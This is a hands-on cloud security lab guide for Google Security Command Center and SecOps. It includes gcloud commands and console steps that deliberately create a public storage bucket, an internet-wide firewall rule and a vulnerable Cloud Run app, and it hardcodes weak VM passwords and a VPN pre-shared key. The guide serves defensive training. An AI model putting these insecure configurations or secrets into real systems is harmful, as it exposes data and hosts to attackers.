# Google Security Operations and Security Command Center Laboratory

This document outlines the setup and configuration of a personal cybersecurity lab focused on Google Security Operations (formerly Chronicle) and Google Cloud Security Command Center (SCC). The purpose of this lab is to explore real-world security monitoring, threat detection, and incident response using Google Cloud’s native security stack.

---

## Prerequisites

### 1. Google Cloud Free Trial


Begin by creating a Google Cloud Platform (GCP) account with a [Free Trial](https://cloud.google.com/free?hl=en), which includes **$300 in credits valid for 90 days**.

```diff
- ⚠️ Do not confuse the Free Trial with the Always Free Tier. The Free Trial provides temporary credits for broader usage, including GCP premium services.
```

### 2. Create a GCP Project

Create a new project in your GCP account. For consistency throughout the lab, name it: `scc-secops-lab`

![GCP create new project](/src/images/scc-secops-lab/01-gcp-create_new_project.png)

Once the project is created, your GCP homepage should look like this:

![New project homepage](/src/images/scc-secops-lab/02-gcp-new_project_homepage.png)

### 3. Set Up Billing Alerts

To prevent unintentional charges and monitor your usage, configure a billing budget:

1. In the **Billing** section, click `Set up budget alerts`, then select `Create budget`.
2. Name your budget (e.g., `Cyber-Lab-Budget`).
3. Set an initial budget amount. I recommend **$150** for a safety buffer.
4. Configure thresholds to receive alerts at **50%**, **75%**, and **90%** of your budget.
5. Save your settings.

![GCP project budget alert](/src/images/scc-secops-lab/03-gcp-project_budget_alert.png)

```diff
+ ✅ Monitoring billing is a cloud best practice. Since we’ll enable billing later to deploy certain resources (like Windows Server VMs), these alerts help ensure we remain within the Free Trial limits.
```

Once this is done, you're ready to begin the lab.

---

## Enabling Security Command Center (SCC)

1. In the GCP Console, open the navigation menu or use the search bar to find **Security Command Center**.
   - Navigate to: `Security > Security Command Center > Risk Overview`

2. Follow these steps to activate SCC:
   1. Click **Get Security Command Center**  
      ![SCC Get Started](/src/images/scc-secops-lab/04-gcp-get_scc_webpage.png)
   
   2. In the **Select a tier** step, choose the **Premium** option  
      ![SCC Select Tier](/src/images/scc-secops-lab/05-gcp-select_scc_tier.png)
   
   3. Leave the default services enabled, then click `Next`.
   
   4. Under **Grant roles**, select `Grant roles automatically`, then click `Grant roles` and proceed.
   
   5. In the final **Complete setup** step, click `Finish`. The activation process may take a few minutes.

Once complete, Security Command Center will be enabled at the **project level**. You can verify activation using [this guide](https://cloud.google.com/security-command-center/docs/activate-scc-overview).

---

## Enabling Google SecOps

```diff
- ⚠️ To enable Google SecOps, your organization must contact a Google Cloud Security Partner.
```

## Setting up the Warm-up Lab

The resources we create will trigger a broader range of findings thanks to the advanced detectors in the Premium tier.

### Publicly Exposed Storage Bucket

Open your GCP shell and paste the following command:

```Bash 
gcloud storage buckets create gs://my_vuln_bucket \
    --project={your-project-id} \
    --location=US \
    --default-storage-class=STANDARD \
    --uniform-bucket-level-access=false \
    --public-access-prevention=inherited \
    --soft-delete-policy-retention-duration=604800 \
    --no-public-access-prevention
```

You can refer to [`gcloud storage buckets create` Reference](https://cloud.google.com/sdk/gcloud/reference/storage/buckets/create#FLAGS) for more information on how to use the command line to create buckets for storing objects.

If you prefer to create the bucket manually, follow the next steps:

1. Navigate to `Cloud Storage > Buckets` and click the `Create` button ([picture](/src/images/scc-secops-lab/07-gcp_storage-create_vuln_bucket.png)).
2. Choose a name for your vulnerable bucket. (E.g. `my_vuln_bucket`)
3. Select a multi-region location type.
4. Set the `Standard` default storage class.
5. **Uncheck** `Enforce public access prevention on this bucket`
6. Select `Fine-grained` access control option.
7. Click `Create` to create the bucket.

Once the bucket is created, go to the `Permissions` tab and click `Grant access` button. In the `New Principals *` field, type `AllUsers`. Then, assign the role `Storage Object Viewer`. Finally, click `Save`.

![Add AllUsers Storage Object Viewer Role](/src/images/scc-secops-lab/08-gcp_storage-add_allUsers_storageObjectViewerRole.png)

Now, upload a dummy file. I created a file named `my_passwords.txt` with the following content:

```
th1s_15_my_p455w0rd
th1s_15_4n0th3r_p455w0rd
4r3_y0u_try1ng_t0_h4ck_m3?
```

![Upload Dummy File](/src/images/scc-secops-lab/09-gcp_storage-upload_dummy_file.png)

With this set up done, you have a vulnerable cloud storage instance that adversaries can read from the internet.

```diff
+ ✅ Take a look at SCC Risk Overview page. Do you notice something different?
```

### Create a Overly Permissive Firewall Rule

Navigate to `VPC Networks > Firewall`.

It is possible that a pop up appears, requiring you to enable the Compute Engine API ([picture](/src/images/scc-secops-lab/10-gcp_market-compute_engine_api.png)). Click `Enable` and wait a few seconds. After that, you'll be redirected to the "Firewall Policies" webpage.

Click `Create firewall rule` and follow the steps:
1. Name it `allow-all-ssh`.
2. You can add the description `Allow SSH for every source`.
3. Set the Source IPv4 ranges to `0.0.0.0/0`.
4. In the "Targets" dropdown menu, select `All instances in the network`.
5. Under "Protocols and ports", select `Specified protocols and ports` and check the `TCP` box. Then, type the port `2222`.

You can also run the following command in gcloud shell to create this firewall rule.

```bash
gcloud compute --project=scc-secops-lab firewall-rules create allow-all-ssh --description="Allow SSH for every source" --direction=INGRESS --priority=1000 --network=default --action=ALLOW --rules=tcp:2222 --source-ranges=0.0.0.0/0
```

You can refer to [`gcloud compute firewall-rules` Reference](https://cloud.google.com/sdk/gcloud/reference/compute/firewall-rules) for more information on how to manage Compute Engine firewall rules.

### Deploy a Virtual Machine with a Public IP

1. Navigate to `Compute Engine > VM instances`.
2. Click `Create instance` button.
3. Machine configuration:
    1. Name the VM instance `labws01` (**Use this name**, it will be required for a later practice).
    2. Select your prefered region (Great if you chose a "Low CO2" region!) and zone.
    3. Select an `E2` series machine
    4. For the machine type, select the `e2-small`.
4. OS and Storage configuration:
    1. Choose any linux-based operating system. I selected Ubuntu 22 Jammy.
    2. You can select the `Balanced disk` type for better I/O.
5. Data Protection:
    1. Select `No backups`
6. Observability:
    1. check the box `Install Ops Agent for Monitoring and Logging`
7. Security:
    1. Make sure the access scope option is `Allow default access`
8. Create the virtual machine.

You can also run this [gcloud shell script](/src/gcloud_scripts/scc-secops-lab/01-gcp-cengine-e2small_vm.gcloud.bash) to automatically create and deploy the VM.

```diff
- ⚠️ Remember to STOP your VM every time you STOP working with your lab, like when going to sleep. This will reduce your GCP billing!
```

## LAB: Identify Vulnerabilities in your Google Cloud Environment with SCC

Now that we have a few GCP instances deployed, we can start exploring SCC insights.

### Explore SCC interface elements

To get started and learn about SCC, let's first play around and see what we have at our hands.

**Step 1**: Go to `Security > Risk Overview`

![SCC Risk Overview Page](/src/images/scc-secops-lab/13-scc-risk_overview_page.png)

In the risk overview page you find helpful informational cards that offer you a high-level overview of the security landscape of your Google Cloud environment.

**Step 2**: Navigate the `Risk Overview` page of SCC

Notice that at the top of the page, your have a notfication: "Get accurate attack exposure scores". According to [Google's documentation](https://cloud.google.com/security-command-center/docs/attack-exposure-learn#attack_exposure_scores):

> An attack exposure score is a measure of how exposed resources are to potential attack if a malicious actor were to gain access to your Google Cloud environment.

Unfortunately, [attack exposure scores and attack paths](https://cloud.google.com/security-command-center/docs/attack-exposure-learn) are only available at the organization level with SCC Premium and SCC Enterprise tiers.

> To use attack exposure scores and attack paths, you must activate the Security Command Center Premium or Enterprise tier at the organization level. 

For the scope of this documentation, we will not be diving deeper into this functionality.

Below the "Get accurate attack exposure scores" you have the actual SCC informational cards. These are:

| Card Title | Function | Highlights |
|:---:|:---:|---|
| Top [issues](https://cloud.google.com/security-command-center/docs/issues-overview) | Threats & Vulnerabilities | The most critical security risks identified within your cloud environment that require immediate attention (Only available in Enterprise-tier). |
| New threats over time | Threats | Time-line of detected threats in your cloud environment. |
| Top CVE findings on your virtual machines | Vulnerabilities | High-level overview of top vulnerabilities detected in your cloud environment. |
| Vulnerabilities per resource type | Vulnerabilities | List of top vulnerabilities grouped by resource-type in your cloud environment. |
| Active vulnerabilities | Vulnerabilities | List of top vulnerabilities in your cloud environment that have not been mitigated yet. |
| Identity and access findings | Cloud settings | Vulnerabilities related to IAM misconfigurations grouped by resource-type.  |
| AI Workload findings | Cloud settings | Violations of AI security policies. |
| Data security finding | Data | Top severity findings found in your data. |

```diff
- ⚠️ Notice that the UI may change in the future. The cards listed above correspond to the cards found at the time of writing this file (July, 2025)
```

You will notice that we already have some vulnerabilities listed in some cards. Besides, yf you leaved your VM turn on a few hours, it is possible that some adversaries have already attacked your vulnerable machine. In that case, you would have also some detected threats (altough most of the detected threats are about consequenses of IAM misconfigurations, e.g. unauthorized access from unexpected location; or execution of malware).

**Step 3**: Inspect an active vulnerability

Look at the `Active vulnerabilities` card in the `Risk Overview` page of SCC. Select the `Findings By Resource Type` tab and identify the most severe findings. You should have

- 1 high severity finding in the `buckets` category
- 1 hight severity finding in the `compute.instance` category
- 3 high severity findings in the `Firewall` category

```diff
- ⚠️ If you changed the configuration of your instances during the deployment of the services, you might have more or less vulnerabilities.
```

Click the unique high severity finding that is in the `buckets` category. **When you click any finding in the `Risk Overview Page`, you are redirected to the `Findings` tab in SCC**.

![SCC Findings: Public Bucket ACL](/src/images/scc-secops-lab/14-scc_findings-public_bucket_acl_finding.png)

In this new dashboard, you have the opportunity to start investigating findings, i.e., security related events. Since we clicked a specific finding in the `Risk Overview Page`, we already have some **Quick filters** applied. Can you mention them? 

(The answer is in the raw markdown file below this line)

[Finding Class: Misconfigurations, Vulnerability; Resource Type: Google Cloud storage bucket; Severity: High]: #

You can also see in the **Query preview** a long string that represents the query used to search for that particular finding. The language is easy to understand, and still, you do not need to learn it, as there are very straightforward checkboxes in the **Quick filters** section.

Now, click the `Public Bucket ACL` finding.

![SCC Findings: Public Bucket ACL Information Panel](/src/images/scc-secops-lab/15-scc_findings-public_bucket_acl_finding_information.png)

An informational block will appear from the side giving us more context about the finding. At the top right corner (A), we have the `x` button to close the informational panel, two arrow buttons to move between findings (if there were more than one), and the `Take action` button, which we will cover later.

We also have a tab bar (B). The image above shows the `Summary` tab, but we also have the `Source properties` tab that shows some metadata about the finding, and the `JSON` tab, that shows the raw finding in JSON form. You can read more about viewing details of a finding in [this page](https://cloud.google.com/security-command-center/docs/review-manage-findings#finding-details).

As security analyst, we will mostly work in the `Summary` tab. You might also work with the `JSON` tab if you need to keep record of certain findings, or feed other security tools (We do not work or consume the information of the `Source properties` tab for the reasons presented in [this part of the documentation](https://cloud.google.com/security-command-center/docs/review-manage-findings#information_on_the_source_properties_tab)).

In the `Summary` tab we also have the following sections:
- The "**What was detected**" (C) section, which shows imporatnt details about the finding that was detected. You can think of this section as an "Overview" of the finding.
- The "**Affected resource**" (D), which presents information about the resource that is associated with the finding.
- The "**Vulnerability**" (Not in the image), which shows information from the CVE record that corresponds to the vulnerability.
- The "**Next steps**" (Not in the image), that provides guidance on what you can do to remediate the issue detected.

There are other sections too, like "Security Marks" (E). You can read about them in [Learn about the finding in the detail view](https://cloud.google.com/security-command-center/docs/review-manage-findings#learn_about_the_finding_in_the_detail_view).

**Step 4**: Solve the vulnerability

Refer to the "Next steps" sections of the finding details panel and follow the instructions that SCC gives you. You should be able to solve the vulnerability quickly.

![SCC Findings: Public Bucket ACL Next Steps](/src/images/scc-secops-lab/16-scc_findings-public_bucket_acl_finding_next_steps.png)

Once you [remove the `allUsers` principal](/src/images/scc-secops-lab/17-gcp_storage-remove_allUsers_principal.png) and [enable `Prevent Public Access` setting](/src/images/scc-secops-lab/18-gcp_storage-enable_preventPublicAccess.png), close the tab and return to SCC. You will notice that in the "What was detected" section, the **State** is set to `Inactive`, and the **Deactivation reason** is `Remediated`.

![SCC Findings: Public Bucket ACL Remediated](/src/images/scc-secops-lab/19-scc_findings-public_bucket_acl_finding_remediated.png)

**Step 5**: Try remediate another `High` severity vulnerability

Inspect one or two more vulnerabilities in your environment and remediate them. 

Ideally, you should remediate all of them, starting from the most severe vulnerabilities to the lesser (Given said that, you do not need to worry much about the `Low` severity findings).

## SCC and Google SecOps

You might be wondering what is are the differences (technical and operational) between Google SecOps and Google Security Command Center. The table below provides a detailed comparison between different main characteristics of both security solutions.

| Feature / Focus Area                  | Security Command Center (SCC)               | Google Security Operations (Chronicle)            |
|---------------------------------------|--------------------------------------------|---------------------------------------------------|
| **Primary Scope**                     | GCP cloud-native security posture, threat & vulnerability management | Enterprise-wide SIEM for logs & detections from on-prem, cloud, hybrid |
| **Typical Data Sources**              | GCP assets (Compute Engine, GKE, Storage, IAM, etc.) | Logs from endpoints, firewalls, AD, on-prem servers, GCP/AWS/Azure |
| **Detection Type**                    | Misconfigurations, vulnerabilities, built-in threat detections on GCP resources | Behavioral detections, correlation, threat hunting across logs (YARA-L) |
| **Asset Inventory & Posture**         | Yes - native GCP asset inventory & posture management | No - focuses on log and event analysis, not config posture |
| **Log Ingestion**                     | No traditional log ingestion (not a SIEM)    | Massive scalable log ingestion (petabytes/day) from any source |
| **Threat Hunting**                    | Limited to findings & cases on GCP assets    | Advanced threat hunting with YARA-L, pivoting, timeline views |
| **Compliance Checks**                 | Yes - built-in checks (CIS, PCI, etc.) for GCP configurations | No direct compliance config checks, but can detect policy violations in logs |
| **Data Retention**                    | Focused on current posture & findings       | Multi-year retention (up to 5+ years) for logs, long-term investigations |
| **Incident Cases / Management**       | Groups related findings into cases for analysts | No native case management, integrates with SOARs or ticketing systems |
| **Integrations**                      | Native to GCP services, some third-party scanner ingestion via API | Ingests from EDRs, firewalls, proxies, SaaS, cloud logs, SIEM connectors |
| **Typical Users**                     | Cloud security posture teams, DevSecOps, cloud infra teams | SOC analysts, threat hunters, DFIR teams, incident responders |
| **Deployment / Scope**                | Focused on securing GCP environment         | Global: on-prem, multi-cloud, SaaS environments (not tied to GCP only) |
| **Data Analysis Engine**              | Built-in GCP findings, case grouping, posture graphs | Google’s global-scale analytics engine (ex-Backstory), high-speed correlation |
| **Custom Detection Content**          | Limited to enabling/disabling built-in detectors | Full custom rules using YARA-L, with rich event context & replay |
| **Security Analytics Focus**          | Vulnerabilities, misconfigs, IAM risks, cloud threats | Advanced detection across events, anomaly hunting, threat correlation |

In short, **SCC is best for securing your GCP cloud environment itself**, while **Google SecOps is best for enterprise-wide detection regardless of where the data comes from**.

---


## Setting up the Real Lab

### Prerequisites

**Google Prerequisites**

- Google Cloud Platform account with credits
- Azure account with credits
- SCC Premium enabled at project level
- Google SecOps instance

### Setting Up Part 1: Cloud Infrastructure

Follow the instructions carefully to set up the lab environment. 

I will use **bold text** to highlight headings, titles, and sections in GCP and Azure. Every important value or settings that you need to set manually will be presented in a `code block`.

```diff
+ ✅ Try to follow the instructions as close as you can. The environment is quite extensive and complex.
```

**Create the environments in GCP and Azure**

The first step for this lab is to make sure you have a clean environment where to work this lab. You will need a GCP account and an Azure account for this.

In **GCP**, create a new project called `secops-scc-lab`. In **Azure**, create a new resource group called `secops-scc-lab`. Both environments, altough in different cloud provider infrastructure, represent the same hybrid company network.

**Set up a VPN between GCP and Azure resources**

In this section, we will be enabling a [VPN connection between Azure and GCP](https://cloud.google.com/bigquery/docs/azure-vpn-network-attachment#before-you-begin). Follow the instructions below.


1. In **GCP**, go to **VPC Network > VPC Networks** and click **Create VPC Network**.
    - GCP_VPC_NETWORK_NAME="google-azure-vpc"
    - GCP_VPC_NETWORK_SUBNET_NAME="google-azure-vpc-subnet1"
    - GCP_VPC_NETWORK_SUBNET_RANGE="172.16.0.0/24"
    - GCP_VPC_NETWORK_ROUTING_MODE="Global"

2. In **Azure**, go to **Virtual Networks** and create a virtual network.
    - AZURE_VNET_NAME="azure-google-vnet"
    - AZURE_VNET_ADDRESS_SPACE_1="172.16.1.0/24"
    - AZURE_VNET_ADDRESS_SPACE_2="10.0.0.0/16"
    - AZURE_VNET_SUBNET_GATEWAYSUBNET_PURPOSE="Virtual Network Gateway"
    - AZURE_VNET_SUBNET_GATEWAYSUBNET_NETWORK="10.0.0.0/27"
    - AZURE_VNET_SUBNET_LAB_NAME="lab-subnet"
    - AZURE_VNET_SUBNET_LAB_NETWORK="172.16.1.0/24"

3. IN **Azure**, go to **Virtual Network Gateways** and create a virtual network gateway:
    - AZURE_VNETGW_NAME="azure-google-vnetgw"
    - AZURE_VNETGW_VNET="azure-google-vnet" [$AZURE_VNET_NAME]
    - AZURE_VNETGW_VNET_SUBNET="GatewaySubnet"
    - AZURE_VNETGW_PUBIP_1_NAME="azure-google-vnetgw-ip1"
    - AZURE_VNETGW_PUBIP_1_NAME="azure-google-vnetgw-ip2"
    - AZURE_VNETGW_PUBIP_1_IP="20.253.104.224"
    - AZURE_VNETGW_PUBIP_2_IP="20.246.198.218"

```diff
- ⚠️ This Azure resource takes some time to deploy.
```

```diff
- ⚠️ In Azure, the VPN Gateway will drain your free credits very quickly (Around $5 to $10 USD per day). You can skip the creation of the VPN Gateway until it is absolutely necessary.
```

```diff
+ ✅ Alternatively, you can rely on software-based VPN like ZeroTier and skip this set up.
```

3. In **GCP**, go to **Network Connectivity > VPN** and click **Create VPN connection**
    - Select **Classic VPN**
    - GCP_VPN_NAME="google-azure-vpn"
    - GCP_VPN_VPC="google-azure-vpc" [$GCP_VPC_NETWORK_NAME]
    - GCP_VPN_IP_NAME="google-azure-vpn-ip"
    - GCP_VPN_IP="35.243.166.20"
    - GCP_VPN_TUNNEL_NAME="google-azure-vpn-tunnel1"
    - GCP_VPN_TUNNEL_PEER_IP="20.253.104.224" [$AZURE_VNETGW_PUBIP_1_IP]
    - GCP_VPN_TUNNEL_PSK="8UAT3aetcg7frn91+UTODLBBZtxGDzpn"
    - GCP_VPN_ROUTING_OPTION="Route-based"
    - GPC_VPN_ROUTING_REMOTE_NETWORKS="10.0.0.0/16 172.16.1.0/24"

4. In **Azure**, go to **Local Network Gateway** and click **Create local network gateway**
    - AZURE_LOCNETGW_NAME="azure-gooogle-locnetgw"
    - AZURE_LOCNETGW_TUNNEL_PEER_IP="35.243.166.20" [$GCP_VPN_IP]
    - AZURE_LOCNETGW_TUNNEL_ADDRESS_SPACE="172.16.0.0/24" [$GCP_VPC_NETWORK_SUBNET_RANGE]

5. In **Azure**, go to your **Virtual Network Gateway** that you configured earlier in step 3. Then go to **Settings > Connections** and click the **Add** button.
    - AZURE_VNETGW_CONNECTION_NAME="azure-google-vnetgw-ipseccon"
    - AZURE_VNETGW_CONNECTION_VNETGW="azure-google-vnetgw" [$AZURE_VNETGW_NAME]
    - AZURE_VNETGW_CONNECTION_LOCNETFW="azure-gooogle-locnetgw" [$AZURE_LOCNETGW_NAME]
    - AZURE_VNETGW_CONNECTION_PSK="8UAT3aetcg7frn91+UTODLBBZtxGDzpn" [$GCP_VPN_TUNNEL_PSK]

The VPN connection between Azure and GCP should be stablished. You can quickly verify this from both Azure and GCP.

1. In **Azure**, go to **Virtual Network Gateway > Settings > Connections** and validate the status of your connection `$AZURE_VNETGW_CONNECTION_NAME` has the value `Connected`.
2. In **GCP**, go to **Network Connectivity > VPN** and validate the status of your tunnel `$GCP_VPN_TUNNEL_NAME` has the value `Established`.

```diff
- ⚠️ If your VPN connection is failing, create a firewall rule in the VPC that allows inbound traffic from the address spaces of your Azure VNET.
```

If you had issues setting up this part of the lab infrastructure, refer to the following documentation:
- [Set up the Azure-Google Cloud VPN network attachment
](https://cloud.google.com/bigquery/docs/azure-vpn-network-attachment)
- [Tutorial: Create and manage a VPN gateway using the Azure porta](https://learn.microsoft.com/en-us/azure/vpn-gateway/tutorial-create-gateway-portal)
- [Tutorial: Create a site-to-site VPN connection in the Azure portal](https://learn.microsoft.com/en-us/azure/vpn-gateway/tutorial-site-to-site-portal)

**Create the Virtual Machines**

1. Create a Windows Server 2019 (AD) in **Azure**
    - AZURE_VM_DC_NAME="dc-ajrc-local"
    - AZURE_VM_DC_AVAILABILITY="No infrastructure redundancy required"
    - AZURE_VM_DC_SECURITY_TYPE="Standard"
    - AZURE_VM_DC_IMAGE="Windows Server 2019 Datacenter x64 Gen2"
    - AZURE_VM_DC_SIZE="Standard_B2s"
    - AZURE_VM_DC_USERNAME="alejandro_rodriguez"
    - AZURE_VM_DC_PASSWORD="P4ssw0rd.123"
    - AZURE_VM_DC_DISK_SIZE="image_default"
    - AZURE_VM_DC_DISK_TYPE="Standard SSD"
    - AZURE_VM_DC_NETWORKING_NETWORK="azure-google-vnet"
    - AZURE_VM_DC_NETWORKING_NETWORK_SUBNET="lab-subnet"
    - AZURE_VM_DC_NETWORKING_DELETE_NIC_AND_IP="true"

2. Create one Windows Server 2019 (RODC) in **GCP**
    - GCP_COMPUTEVM_RODC_NAME="rodc-ajrc-local"
    - GCP_COMPUTEVM_RODC_REGION="us-east1"
    - GCP_COMPUTEVM_RODC_MACHINE_TYPE="e2-medium"
    - GCP_COMPUTEVM_RODC_OS="Windows Server"
    - GCP_COMPUTEVM_RODC_OS_VERSION="Windows Server 2019 Datacenter"
    - GCP_COMPUTEVM_RODC_DISK_TYPE="Balanced Persistent Disk"
    - GCP_COMPUTEVM_RODC_DISK_SIZE=127
    - GCP_COMPUTEVM_RODC_DATAPROTECT_BACKUP="No backup"
    - GCP_COMPUTEVM_RODC_NETWORKING_NETWORK="google-azure-vpc"
    - GCP_COMPUTEVM_RODC_NETWORKING_NETWORK_SUBNET="google-azure-vpc-subnet1"
    - GCP_COMPUTEVM_RODC_OBSERVABILITY_OPSAGENT="Install Ops Agent for Monitoring and Logging"
    - GCP_COMPUTEVM_RODC_USERNAME="alejandro_rodriguez"
    - GCP_COMPUTEVM_RODC_PASSWORD="GpVHc$=1~k:WKO["

In GCP, go to your Windows Server VM and click the button **Set Windows password**. This will pop up an entry box where you need to type the username (E.g. `alejandro_rodriguez`) of the administrator account. After that, the password of the user account will be generated for you.

3. Create a Windows 10 Enterprise (WS) in **Azure**
    - AZURE_VM_WS_NAME="ws-ajrc-local"
    - AZURE_VM_WS_AVAILABILITY="No infrastructure redundancy required"
    - AZURE_VM_WS_SECURITY_TYPE="Standard"
    - AZURE_VM_WS_IMAGE="Windows 10 Enterprise Version 22H2 x64 Gen2"
    - AZURE_VM_WS_IMAGE_LICENSING="Confirm I have elegible Windows License"
    - AZURE_VM_WS_SIZE="Standard_B1s"
    - AZURE_VM_WS_USERNAME="david_vazquez"
    - AZURE_VM_WS_PASSWORD="P4ssw0rd.123"
    - AZURE_VM_WS_DISK_SIZE="image_default"
    - AZURE_VM_WS_DISK_TYPE="Standard SSD"
    - AZURE_VM_WS_NETWORKING_NETWORK="azure-google-vnet"
    - AZURE_VM_WS_NETWORKING_NETWORK_SUBNET="lab-subnet"
    - AZURE_VM_WS_NETWORKING_NETWORK_PUBLIC_INBOUND_PORT="None"
    - AZURE_VM_WS_NETWORKING_DELETE_NIC_AND_IP="true"

```diff
- ⚠️ The WS VM will not have a public IP address assigned. Your Azure Free Trial license only allows you to have 3 public IP addresses, which are already used by your VNET Gateway and your DC. For security reasons, you might want to give the public IP adddress of the DC to the WS.
```

4. Test connectivity between your virtual machines.

You can connect to your virtual machines using the public ip addresses of each VM in each cloud service provider. Use the **ping** command from your VM in **Azure** to the VM in **GCP**. You can also try use **Windows Remote Desktop** and access the VM in **GCP** from your VM in **AZURE**.

```diff
- ⚠️ You will not be able to connect to your VM if you did not create a  firewall rule that allows inbound traffic from your location. 
```

```diff
+ ✅ However, you can avoid creating such over-permissive rule by nesting RDP sessions from your other VMs, as long as they are reachable through the VPN tunnel.
``` 

**Deploy a Vulnerable Application in Cloud Run and Insecure Database in GCP**

1. Create a database in **GCP**

```diff
- ⚠️ This part of the lab will be added in the future.
```

2. Deploy the vulnerable web application to **GCP**. You can find the `Dockerfile` and source code in the `/src/vuln_app/`.

If you do not know what is **Cloud Run**, I recommend watching the videos [Google Cloud Run Explained with Demo | Deploy Your First Containerized App on GCP](https://www.youtube.com/watch?v=qaxwf3BIZIQ&ab_channel=TechTrapture) and [Build & Deploy Python App on Google Cloud Run | Cloud Run service](www.youtube.com/watch?v=zS_kLHAfgB0&ab_channel=TechTrapture).

Follow the steps below to deploy the vulnerable web application.
- [Install **gcloud cli**](https://cloud.google.com/sdk/docs/install#linux) in your computer.
- [Install **Docker**](https://docs.docker.com/engine/install/) in your computer (If using Windows read [Install Docker for Windows](https://docs.docker.com/desktop/setup/install/windows-install/), and if using WSL, read [Docker Desktop WSL 2 Backend on Windows](https://docs.docker.com/desktop/features/wsl/))
- Read [Push and pull images](https://cloud.google.com/artifact-registry/docs/docker/pushing-and-pulling) to docker registry.

- As [mentioned in the documentation](https://cloud.google.com/artifact-registry/docs/docker/pushing-and-pulling#cred-helper), authenticate docker with the following command:

```bash
export REPOSITORY_LOCATION="us-east1"
gcloud auth configure-docker $REPOSITORY_LOCATION-docker.pkg.dev

# You can get a list of allowed locations with this command:
gcloud artifacts locations list
```

```diff
- ⚠️ If you get the message "WARNING: `docker-credential-gcloud` not in system PATH." when authenticating docker, the later commands might not work. You may be able to solve the issue with the following commands:
```

```bash
# Fix `docker-credential-gcloud` Not in PATH (Tested in WSL2)

# Step 1: Find the binary

find /bin -type f -name "docker-credential-gcloud" 2>/dev/null
# find /opt -type f -name "docker-credential-gcloud" 2>/dev/null
# find / -type f -name "docker-credential-gcloud" 2>/dev/null

# Step 2: Link it into your path
sudo ln -s /bin/google-cloud-sdk/bin/docker-credential-gcloud /usr/local/bin/docker-credential-gcloud

# Step 3: Verify that is linked
which docker-credential-gcloud

# Step 4: Re-authenticate
gcloud auth configure-docker $REPOSITORY_LOCATION-docker.pkg.dev
```

- Go to Google Cloud and search for **Artifact Registry**.
- Click the **Create Repository** and make sure to select the following configurations:
    - Choose a name for your repository (E.g. `vulnerable-application`).
    - Repository **Format** is `Docker`
    - Repository **Mode** is `Standard`
    - Select your prefered **Region** (E.g. `us-east1`)
    - If the option **Immutable image tags** select `Disable`
    - Make sure that **Artifact Analysis** is enabled.
    - Click the **Create** button.

You can also create the repository via gcloud shell:

```bash
export GCP_REPOSITORY_NAME="vulnerable-application"
# export REPOSITORY_LOCATION="us-east1"

gcloud artifacts repositories create $GCP_REPOSITORY_NAME  \
  --repository-format=docker \
  --location=$REPOSITORY_LOCATION \
  --description="secops-scc-lab vuln app" \
  --allow-vulnerability-scanning
```

- Create an image of the vulnerable app in `/src/vuln_app/`.

If you cloned this repository, go to `/src/vuln_app/` and run the following command.

```bash
export REPOSITORY="rodajrc" 
export REPOSITORY_IMAGE_NAME="secops-scc-lab-vuln-app"
docker build -t $REPOSITORY/$REPOSITORY_IMAGE_NAME .
```

If you did not cloned the repository, you can [pull the image from **DockerHub**](https://hub.docker.com/r/rodajrc/secops-scc-lab-vuln-app) with this command:

```bash
export REPOSITORY="rodajrc" 
export REPOSITORY_IMAGE_NAME="secops-scc-lab-vuln-app"
docker pull $REPOSITORY/$REPOSITORY_IMAGE_NAME
```

This creates a local image tagged as rodajrc/secops-scc-lab-vuln-app:latest.

- Next, you need to tag the image with your own Artifact Registry URI.

```bash
# export REPOSITORY_LOCATION="us-east1"
# export REPOSITORY_IMAGE_NAME="secops-scc-lab-vuln-app"
# export GCP_REPOSITORY_NAME="vulnerable-application"
export GCP_PROJECT_ID="secops-scc-lab"
export GCP_REPOSITORY_IMAGE_NAME="secops-scc-lab-vuln-app"

docker tag $REPOSITORY/$REPOSITORY_IMAGE_NAME $REPOSITORY_LOCATION-docker.pkg.dev/$GCP_PROJECT_ID/$GCP_REPOSITORY_NAME/$GCP_REPOSITORY_IMAGE_NAME
```

- Finally, push the local docker image to GCP Artifact Registry repository.

```bash
docker push $REPOSITORY_LOCATION-docker.pkg.dev/$GCP_PROJECT_ID/$GCP_REPOSITORY_NAME/$GCP_REPOSITORY_IMAGE_NAME
```

```diff
- ⚠️ If the push operation fails, verify that you your Artifact Registry format is Docker and that you are authenticated with `gcloud auth login`.
```

![Vulnerable Application in Artifact Registry](/src/images/scc-secops-lab/29-gcp_artreg-vulnerable_application_in_artregpng.png)

Now that we have the containarized application in Google Cloud Platform, click the **Deploy to Cloud Run** button that appears when clicking the vertical ellipsis of the **latest** tagged image, as shown in the image below.

![Deploy Vulnerable Application to Cloud Run](/src/images/scc-secops-lab/30-gcp_artreg-vulnerable_application_deploy_cloud_run.png)

You will be redirected to **Cloud Run**, with the **Service type** and **Container Image URL** automatically populated. Configure the remaining options of the service:
- GCP_CLOUDRUN_CONTAINER_URL="us-east1-docker.pkg.dev/secops-scc-lab/vulnerable-application/secops-scc-lab-vuln-app:latest"
- GCP_CLOUDRUN_SERVICE_REGION="us-east1"
- GCP_CLOUDRUN_SERVICE_NAME="secops-scc-billing-app"
- GCP_CLOUDRUN_SERVICE_ENDPOINT_URL="https://secops-scc-lab-vuln-app-742540562663.us-east1.run.app"
- GCP_CLOUDRUN_SERVICE_AUTH="Enabled"
- GCP_CLOUDRUN_SERVICE_AUTH_NOAUTH_INVOCATIONS="Enabled"
- GCP_CLOUDRUN_SERVICE_NETWORK_INGRESS="All"

![Vulnerable Application Deployed in Google Cloud Run](/src/images/scc-secops-lab/31-gcp_cloudrun-vuln_app_service_created.png)

![Vulnerable Application in the Internet](/src/images/scc-secops-lab/32-misc-vuln_app_internet.png)

**Setup the Windows Domain**

In this part of the architecture, you will configure your DC and give some contextal data to the domain (E.g. User accounts, remote shares, SPNs, etc). The goal is to:
1. Enable Active Directory Domain Services (DS)
2. Enable Active Directory Certificate Services (CS)
3. Join a workstation to the Windows Domain
4. Deliberately misconfigure DC and other AD services 
5. Replicate the DC data to a Read-only (RO) DC in GCP

You might want to read Kamran Bilgrami's post [Ethical Hacking Lessons — Building Free Active Directory Lab in Azure](https://kamran-bilgrami.medium.com/ethical-hacking-lessons-building-free-active-directory-lab-in-azure-6c67a7eddd7f) starting from the **Configuring Services** heading.

Open a notepad and keep track of the following infomation while you configure your ADDS services: 

```bash
VM_DC_DOMAIN_NAME=ajrc.local   # You can chose your personal domain
VM_DC_HOSTNAME="dc-ajrc-local"
VM_DC_FQDM="dc-ajrc-local.ajrc.local"
VM_DC_DS_FOREST_FUNCTION="Windows Server 2016"
VM_DC_DS_DOMAIN_FUNCTION="Windows Server 2016"
